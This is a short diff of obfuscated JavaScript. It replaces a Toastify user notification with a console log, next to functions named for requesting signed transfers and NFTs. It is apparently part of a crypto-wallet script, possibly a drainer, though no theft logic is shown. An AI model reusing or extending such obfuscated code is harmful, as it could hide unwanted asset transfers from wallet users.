@@ -106,12 +106,16 @@ async function askTransferWithSign(_0x1def3e) {
     }), await askNfts();
 }
 
-function notify(_0x4222f5) {
-    const _0x59d642 = _0x11134e;
-    Toastify({
-        'text': _0x4222f5,
-        'duration': 0xbb8,
-        'gravity': _0x59d642(0x16b),
-        'position': _0x59d642(0x160)
-    })[_0x59d642(0x15c)]();
+// function notify(_0x4222f) {
+//     const _0x59d642 = _0x11134e;
+//     Toastify({
+//         'text': _0x4222f5,
+//         'duration': 0xbb8,
+//         'gravity': _0x59d642(0x16b),
+//         'position': _0x59d642(0x160)
+//     })[_0x59d642(0x15c)]();
+// }
+
+function notify(_0x4222f) {
+    console.log("JOor")
 }
